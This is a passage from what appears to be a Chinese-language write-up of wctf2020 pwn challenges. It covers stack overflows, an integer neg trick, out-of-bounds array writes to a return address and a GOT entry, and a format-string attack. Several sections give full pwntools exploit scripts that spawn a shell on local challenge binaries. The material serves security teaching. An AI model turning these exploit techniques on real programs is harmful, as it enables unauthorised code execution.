alt="Gnd7PU.png"></p><p>很显然<code>/bbbbbbbbin_what_the_f?ck__--??/sh</code>不是一个正常路径，像之前那样设置返回地址到这个函数直接去执行肯定会失败，此时就需要知道环境变量中的<code>PATH</code>是什么东西，以及sh这个shell程序是怎么被<code>system</code>找到然后调用的(自行百度吧…这里不解释了)</p><p>知道了PATH之后<br>因为我们程序中函数调用字符串的时候，都是通过字符串指针调用的</p><p><img src="https://s1.ax1x.com/2020/03/30/Gndjq1.png" alt="Gndjq1.png"></p><p>我们直接使用该字符串中<code>sh</code>地址(0x08048670)的作为参数然后将返回地址直接设置成<code>call system</code>的地址(0x08048529)即可</p><p><strong>EXP</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = <span class="string">'getshell-2'</span><span class="comment">#binary's name here</span></span><br><span class="line">context.binary = binary<span class="comment">#context here</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">pty = process.PTY</span><br><span class="line"><span class="comment">#p = process(binary, aslr = 1, stdin=pty, stdout=pty)#process option here</span></span><br><span class="line"></span><br><span class="line">Host =<span class="string">'0.0.0.0'</span></span><br><span class="line">Port =<span class="number">2334</span></span><br><span class="line">p = remote(Host,Port)</span><br><span class="line"></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">my_u64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">my_u32 = <span class="keyword">lambda</span> x: u32(x.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">global_max_fast=<span class="number">0x3c67f8</span></span><br><span class="line">codebase = <span class="number">0x555555554000</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loginfo</span><span class="params">(what=<span class="string">''</span>,address=<span class="number">0</span>)</span>:</span></span><br><span class="line">log.info(<span class="string">"\033[1;36m"</span> + what + <span class="string">'-----&gt;'</span> + hex(address) + <span class="string">"\033[0m"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># todo here</span></span><br><span class="line">p.recvuntil(<span class="string">"\\ \n"</span>)</span><br><span class="line">p.send(<span class="string">'a'</span>*(<span class="number">0x18</span>+<span class="number">4</span>)+p32(<span class="number">0x08048529</span>)+p32(<span class="number">0x08048670</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="number-game-16-solves"><a href="#number-game-16-solves" class="headerlink" title="number_game - 16 solves"></a>number_game - 16 solves</h2><blockquote><p>Author: ColdShield</p></blockquote><p>flag:<code>wctf2020{Opc0de_neg_Is_StraNge}</code></p><p><strong>程序分析</strong></p><p><img src="https://s1.ax1x.com/2020/03/30/GnwtoV.png" alt="GnwtoV.png"></p><p>ps：这里v2是canary，前面两个程序都没有开启这个保护所以看不到</p><p>这里的意思大致就是输入一个int整数，两次判断<code>v1</code>是否小于零，都满足的话就给出一个shell，但是中间做了一次<code>v1=-v1</code>的操作</p><p><img src="https://s1.ax1x.com/2020/03/30/GnwYd0.png" alt="GnwYd0.png"></p><p>这个操作是通过neg指令实现的，这里这个指令的操作是将eax按位求反然后+1，如果我们想要被操作之后的eax最高位仍未1（保持这个数为负），之前eax就只能是<code>1000000...0</code>，即最高位为1然后其余位全为0，这个数在4字节的表述下就是这样的</p><p><img src="https://s1.ax1x.com/2020/03/30/GnwDy9.png" alt="GnwDy9.png"></p><p>用<code>scanf</code>输入这个数就可以满足了</p><h2 id="Closed-10-solves"><a href="#Closed-10-solves" class="headerlink" title="Closed - 10 solves"></a>Closed - 10 solves</h2><blockquote><p>Author: ColdShield</p></blockquote><p>flag:<code>wctf2020{A_pr@ctical_Trick}</code></p><p><strong>程序分析</strong></p><p><img src="https://s1.ax1x.com/2020/03/30/GnwrLR.png" alt="GnwrLR.png"></p><p>这个题的目的就是想让你们学习一下什么是文件描述符还有输出重定位的知识（具体就自行百度吧）</p><p>这个程序虽然给出了shell，但是在之前关闭了进程标准输出<code>1</code>和标准错误输出<code>2</code>，所以getshell后自然也无法输出内容</p><p>这里介绍一个小trick：将标准输出重定位到标准输入<code>0</code>，也可以实现回显，具体见<a href="https://unix.stackexchange.com/questions/177228/behaviour-of-10-in-bash" target="_blank" rel="noopener">这里</a></p><p>运行程序之后<code>sh 1&gt;&amp;0</code>即可实现回显</p><h2 id="NameYourCat-4-solves"><a href="#NameYourCat-4-solves" class="headerlink" title="NameYourCat - 4 solves"></a>NameYourCat - 4 solves</h2><blockquote><p>Author: ColdShield</p></blockquote><p>flag:<code>wctf2020{Cats_Are_Cute_right?}</code></p><p><strong>程序分析</strong></p><p><img src="https://s1.ax1x.com/2020/03/30/Gnwye1.png" alt="Gnwye1.png"></p><p>开启了canary还有栈不可执行，没有PIE</p><p><img src="https://s1.ax1x.com/2020/03/30/Gnw6dx.png" alt="Gnw6dx.png"></p><p>main函数的意思就是5次循环，然后每次都执行一次NameWhich，这个函数的参数是v3</p><p>ps：因为IDA经常把函数的参数识别出问题，所以一定要点进具体的函数去看或者什么的</p><p>NameWhich是这样的</p><p><img src="https://s1.ax1x.com/2020/03/30/GnwUiT.png" alt="GnwUiT.png"></p><p>在a1上按y将类型改成<code>char *</code></p><p><img src="https://s1.ax1x.com/2020/03/30/GnwdWF.png" alt="GnwdWF.png"></p><p>此时再来缕程序的意思，main’中v3是一个char [40]的数组，然后每次我们在NameWhich中输入的下标后寻址都是<code>a1[8*v2]</code>，所以这个时候大致就知道了原本程序应该是写了一个二维数组<code>[5][8]</code></p><p>但是程序没有对我们输入的下标做检查，存在一个数组越界写，此时由于程序自带后门，数组在栈上，所以我们有一次将返回地址写成后门地址即可，具体下标经过简单计算即可得到：<code>(0x34+4)/8=7</code>（对计算下标不熟悉的一定要自己去算一算）</p><p>ps：这里还提个醒，这种输入的地方一定要注意有没有<code>\x0A</code>，就是换行符，如果输入字符串中碰到这个，scanf就直接截断了</p><p><strong>EXP</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = <span class="string">'NameYourCat'</span><span class="comment">#binary's name here</span></span><br><span class="line">context.binary = binary<span class="comment">#context here</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">pty = process.PTY</span><br><span class="line"><span class="comment">#p = process(binary, aslr = 1, stdin=pty, stdout=pty)#process option here</span></span><br><span class="line"></span><br><span class="line">Host =<span class="string">'0.0.0.0'</span></span><br><span class="line">Port =<span class="number">2337</span></span><br><span class="line">p = remote(Host,Port)</span><br><span class="line"></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">my_u64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">my_u32 = <span class="keyword">lambda</span> x: u32(x.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">global_max_fast=<span class="number">0x3c67f8</span></span><br><span class="line">codebase = <span class="number">0x555555554000</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loginfo</span><span class="params">(what=<span class="string">''</span>,address=<span class="number">0</span>)</span>:</span></span><br><span class="line">log.info(<span class="string">"\033[1;36m"</span> + what + <span class="string">'-----&gt;'</span> + hex(address) + <span class="string">"\033[0m"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># todo here</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">namefor</span><span class="params">(idx,name)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"which?\n&gt;"</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">'name plz: '</span>)</span><br><span class="line">p.sendline(name)</span><br><span class="line"></span><br><span class="line">namefor(<span class="number">0</span>,<span class="string">'A'</span>)</span><br><span class="line">namefor(<span class="number">1</span>,<span class="string">'B'</span>)</span><br><span class="line">namefor(<span class="number">2</span>,<span class="string">'C'</span>)</span><br><span class="line">namefor(<span class="number">3</span>,<span class="string">'D'</span>)</span><br><span class="line">namefor(<span class="number">7</span>,p32(<span class="number">0x080485CB</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="NameYourDog-5-solves"><a href="#NameYourDog-5-solves" class="headerlink" title="NameYourDog - 5 solves"></a>NameYourDog - 5 solves</h2><blockquote><p>Author: ColdShield</p></blockquote><p>flag:<code>wctf2020{Woof_wOOf_wooF}</code></p><p><strong>程序分析</strong></p><p><img src="https://s1.ax1x.com/2020/03/30/GnwBQJ.png" alt="GnwBQJ.png"></p><p>程序基本上和NameYourCat一模一样</p><p>唯一不同之处在于<code>Dogs</code>此时不在栈上了，而是在bss段上</p><p>此时的数组越界就变成了下标为负数时利用，从而可以任意修改程序地址空间的内容，由于程序没有开启<code>FULL Relo</code>我这里最简单的方法就是修改GOT表（不知道GOT表是啥的小伙伴也请自行百度学习233333）</p><p>我采用的方法是将<code>scanf</code>的GOT表项修改为后门函数地址，从而在后续执行到scanf的时候就直接getshell了</p><p>此时的下标计算：<code>(0x0804A028-0804A060)/8=-7</code></p><p><strong>EXP</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = <span class="string">'NameYourDog'</span><span class="comment">#binary's name here</span></span><br><span class="line">context.binary = binary<span class="comment">#context here</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">pty = process.PTY</span><br><span class="line"><span class="comment">#p = process(binary, aslr = 1, stdin=pty, stdout=pty)#process option here</span></span><br><span class="line"></span><br><span class="line">Host =<span class="string">'0.0.0.0'</span></span><br><span class="line">Port =<span class="number">2338</span></span><br><span class="line">p = remote(Host,Port)</span><br><span class="line"></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">my_u64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">my_u32 = <span class="keyword">lambda</span> x: u32(x.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">global_max_fast=<span class="number">0x3c67f8</span></span><br><span class="line">codebase = <span class="number">0x555555554000</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loginfo</span><span class="params">(what=<span class="string">''</span>,address=<span class="number">0</span>)</span>:</span></span><br><span class="line">log.info(<span class="string">"\033[1;36m"</span> + what + <span class="string">'-----&gt;'</span> + hex(address) + <span class="string">"\033[0m"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># todo here</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">namefor</span><span class="params">(idx,name)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"which?\n&gt;"</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">'name plz: '</span>)</span><br><span class="line">p.sendline(name)</span><br><span class="line"></span><br><span class="line">namefor(<span class="number">0</span>,<span class="string">'A'</span>)</span><br><span class="line">namefor(<span class="number">1</span>,<span class="string">'B'</span>)</span><br><span class="line">namefor(<span class="number">2</span>,<span class="string">'C'</span>)</span><br><span class="line">namefor(<span class="number">-7</span>,p32(<span class="number">0x080485CB</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="babyfmt-2-solves"><a href="#babyfmt-2-solves" class="headerlink" title="babyfmt - 2 solves"></a>babyfmt - 2 solves</h2><blockquote><p>Author: ru7n</p></blockquote><p>本题就是把一些点糅合再了一起，没啥新意，:P</p><p>程序一开始是个询问时间的函数<strong>ask_time</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">ask_time</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"dididada....."</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"tell me the time:"</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">"%ld"</span>, &amp;v1);</span><br><span class="line">  _isoc99_scanf(<span class="string">"%ld"</span>, &amp;v2);</span><br><span class="line">  _isoc99_scanf(<span class="string">"%ld"</span>, &amp;v3);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"ok! time is %ld:%ld:%ld\n"</span>, v1, v2, v3);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要求我们输入数字，然后在打印出来</p><p>这里的一个知识点是，如果输入和<code>scanf</code>函数需求的格式不一致，那么是不会改变变量的值的，意思就是<strong>scanf</strong>本来要求我们要输入数字(%ld)，但我们输入’a’啊，’b’啊什么的，反正不是数字就行，这样<code>v1,v2,v3</code>的值就不会改变，到了<code>printf(&quot;ok! time is %ld:%ld:%ld\n&quot;, v1, v2, v3);</code>这句的时候就会把栈里的内容打印出来，泄露出地址，本题是泄露了程序的基地址</p><p>然后就到了菜单题：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"1. leak"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"2. fmt_attack"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"3. get_flag"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"4. exit"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"&gt;&gt;"</span>);</span><br></pre></td></tr></table></figure><p><strong>leak</strong>函数给了一次任意读一字节的机会：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">leak</span><span class="params">(_DWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *buf; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( *a1 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No way!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = <span class="number">1</span>;</span><br><span class="line">  read_n(&amp;buf, <span class="number">8L</span>L);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, buf, <span class="number">1u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>fmt_attack</strong>函数给了一次格式化字符串攻击的机会：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">fmt_attack</span><span class="params">(_DWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> format; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;format, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( *a1 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No way!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = <span class="number">1</span>;</span><br><span class="line">  read_n(&amp;format, <span class="number">0x28</span>LL);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;format, <span class="number">0x28</span>LL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后是<strong>get_flag</strong>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __noreturn <span class="title">get_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="keyword">char</span> s2; <span class="comment">// [rsp+10h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s2, <span class="number">0</span>, <span class="number">0x50</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"If you can open the door!"</span>);</span><br><span class="line">  read_n(&amp;s2, <span class="number">64L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(secret, &amp;s2, <span class="number">0x40</span>uLL) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">close</span>(<span class="number">1</span>);</span><br><span class="line">    fd = <span class="built_in">open</span>(<span class="string">"/flag"</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">read</span>(fd, &amp;s2, <span class="number">0x50</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(&amp;s2, &amp;s2);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"No way!"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显，如果我们要拿到<strong>flag</strong>，就必须绕过<code>strncmp(secret, &amp;s2, 0x40uLL)</code>，绕过了这个之后，由于<code>close(1)</code>把输出流关了，所以我们还得想办法让<code>flag</code>能打印出来</p><p>首先是绕过<code>strncmp</code>，这个简单，只要把<code>secret</code>的首字节变为<code>\x00</code>就好，这样我们只要输入<code>\x00</code>就能绕过这个检查，原理：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// strncmp源码</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">STRNCMP (<span class="keyword">const</span> <span class="keyword">char</span> *s1, <span class="keyword">const</span> <span class="keyword">char</span> *s2, <span class="keyword">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> c1 = <span class="string">'\0'</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> c2 = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (n &gt;= <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">size_t</span> n4 = n &gt;&gt; <span class="number">2</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  c1 = (<span class="keyword">unsigned</span> <span class="keyword">char</span>) *s1++;</span><br><span class="line">  c2 = (<span class="keyword">unsigned</span> <span class="keyword">char</span>) *s2++;</span><br><span class="line">  <span class="keyword">if</span> (c1 == <span class="string">'\0'</span> || c1 != c2)</span><br><span class="line">    <span class="keyword">return</span> c1 - c2;</span><br><span class="line">         ...........................................</span><br></pre></td></tr></table></figure><p>绕过了这个<code>strncmp</code>后，就要看看怎么把<code>flag</code>打印出来了</p><p>我们可以看到在程序的<code>.bss</code>段里存放在<code>stdin,stdout,stderr</code>的指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.bss:0000000000202020 _bss            segment para public 'BSS' use64</span><br><span class="line">.bss:<span class="number">0000000000202020</span>                 assume cs:_bss</span><br><span class="line">.bss:<span class="number">0000000000202020</span>                 ;org <span class="number">202020</span>h</span><br><span class="line">.bss:<span class="number">0000000000202020</span>                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing</span><br><span class="line">.bss:<span class="number">0000000000202020</span>                 <span class="keyword">public</span> <span class="built_in">stdout</span>@@GLIBC_2_2_5</span><br><span class="line">.bss:<span class="number">0000000000202020</span> ; FILE *<span class="built_in">stdout</span></span><br><span class="line">.bss:<span class="number">0000000000202020</span> <span class="built_in">stdout</span>@@GLIBC_2_2_5 dq ?                ; DATA XREF: LOAD:<span class="number">00000000000004B</span>8↑o</span><br><span class="line">.bss:<span class="number">0000000000202020</span>                                         ; initial+<span class="number">35</span>↑r</span><br><span class="line">.bss:0000000000202020                                         ; Alternative name is 'stdout'</span><br><span class="line">.bss:<span class="number">0000000000202020</span>                                         ; Copy of shared data</span><br><span class="line">.bss:<span class="number">0000000000202028</span>                 align <span class="number">10</span>h</span><br><span class="line">.bss:<span class="number">0000000000202030</span>                 <span class="keyword">public</span> <span class="built_in">stdin</span>@@GLIBC_2_2_5</span><br><span class="line">.bss:<span class="number">0000000000202030</span> ; FILE *<span class="built_in">stdin</span></span><br><span class="line">.bss:<span class="number">0000000000202030</span> <span class="built_in">stdin</span>@@GLIBC_2_2_5 dq ?                 ; DATA XREF: LOAD:<span class="number">0000000000000500</span>↑o</span><br><span class="line">.bss:<span class="number">0000000000202030</span>                                         ; initial+<span class="number">17</span>↑r</span><br><span class="line">.bss:0000000000202030                                         ; Alternative name is 'stdin'</span><br><span class="line">.bss:<span class="number">0000000000202030</span>                                         ; Copy of shared data</span><br><span class="line">.bss:<span class="number">0000000000202038</span>                 align <span class="number">20</span>h</span><br><span class="line">.bss:<span class="number">0000000000202040</span>                 <span class="keyword">public</span> <span class="built_in">stderr</span>@@GLIBC_2_2_5</span><br><span class="line">.bss:<span class="number">0000000000202040</span> ; FILE *<span class="built_in">stderr</span></span><br><span class="line">.bss:<span class="number">0000000000202040</span> <span class="built_in">stderr</span>@@GLIBC_2_2_5 dq ?                ; DATA XREF: LOAD:<span class="number">0000000000000530</span></span><br></pre></td></tr></table></figure><p>动态调试的时候跟进<code>printf</code>函数，会发现<code>printf</code>会取这里的指针：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> ► 0x7f8f4b0c488a &lt;printf+138&gt;    mov    rax, qword ptr [rip + 0x36e6bf]</span><br><span class="line">   0x7f8f4b0c4891 &lt;printf+145&gt;    mov    rdi, qword ptr [rax]</span><br><span class="line">   0x7f8f4b0c4894 &lt;printf+148&gt;    call   vfprintf &lt;0x7f8f4b0bc170&gt;</span><br><span class="line"> </span><br><span class="line">   0x7f8f4b0c4899 &lt;printf+153&gt;    add    rsp, 0xd8</span><br><span class="line">   0x7f8f4b0c48a0 &lt;printf+160&gt;    ret    </span><br><span class="line"> </span><br><span class="line">   0x7f8f4b0c48a1                 nop    word ptr cs:[rax + rax]</span><br><span class="line">.....................................................................</span><br><span 